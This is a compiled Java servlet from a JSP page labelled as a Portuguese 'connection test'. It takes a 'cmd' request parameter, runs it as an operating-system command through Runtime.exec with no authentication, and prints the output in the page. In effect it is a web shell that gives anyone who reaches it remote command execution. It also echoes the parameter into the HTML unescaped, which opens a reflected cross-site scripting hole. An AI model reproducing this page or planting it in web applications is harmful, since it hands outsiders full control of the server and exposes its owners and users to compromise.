package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;
import org.apache.jasper.runtime.*;
import java.io.*;
import java.net.*;

public class testCmd_jsp extends HttpJspBase {


  private static java.util.Vector _jspx_includes;

  public java.util.List getIncludes() {
    return _jspx_includes;
  }

  public void _jspService(HttpServletRequest request, HttpServletResponse response)
        throws java.io.IOException, ServletException {

    JspFactory _jspxFactory = null;
    javax.servlet.jsp.PageContext pageContext = null;
    HttpSession session = null;
    ServletContext application = null;
    ServletConfig config = null;
    JspWriter out = null;
    Object page = this;
    JspWriter _jspx_out = null;


    try {
      _jspxFactory = JspFactory.getDefaultFactory();
      response.setContentType("text/html; charset=ISO-8859-1");
      pageContext = _jspxFactory.getPageContext(this, request, response,
      			null, true, 8192, true);
      application = pageContext.getServletContext();
      config = pageContext.getServletConfig();
      session = pageContext.getSession();
      out = pageContext.getOut();
      _jspx_out = out;

      out.write("\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">\n<title>Teste de conexão</title>\n</head>\n<body>\r\n\r\n<form method=\"get\" action=\"testCmd.jsp\">\r\n\tComando:<input type=\"text\" name=\"cmd\" size=\"200\" value=\"");
                                                                  out.print(request.getParameter("cmd")==null?"":request.getParameter("cmd"));
      out.write("\">\r\n\t<input type=\"submit\" name=\"testa\" value=\"Executa\">\r\n\t<input type=\"reset\" name=\"reset\">\r\n</form>\n\r\n");
                   
if(request.getParameter("cmd") != null){
	String cmd = request.getParameter("cmd");
	Runtime rt = Runtime.getRuntime();
	Process ps = rt.exec(cmd);
	//int retorno = ps.waitFor();

      out.write("\r\n\tRetorno do processo : <br>\r\n\tStdin:<br>\r\n\t<hr>\r\n\t<code>\r\n");
                        	
	BufferedReader reader = new BufferedReader(new InputStreamReader(ps.getInputStream()));
	String c=null;
	while( (c= reader.readLine()) != null){
		out.println(c);out.println("<br>");
	}
	reader.close();
		

      out.write("\r\n\t</code>\r\n\t<br/>\r\n\tStderr:<br>\r\n\t<hr>\r\n");
                        	
	reader = new BufferedReader(new InputStreamReader(ps.getErrorStream()));

	c = null;
	while( (c= reader.readLine()) != null){
		out.println(c);out.println("<br>");
	}
	reader.close();
		
}	


      out.write("\r\n\t\n\n</body>\n</html>");
                } catch (Throwable t) {
      out = _jspx_out;
      if (out != null && out.getBufferSize() != 0)
        out.clearBuffer();
      if (pageContext != null) pageContext.handlePageException(t);
    } finally {
      if (_jspxFactory != null) _jspxFactory.releasePageContext(pageContext);
    }
  }
}
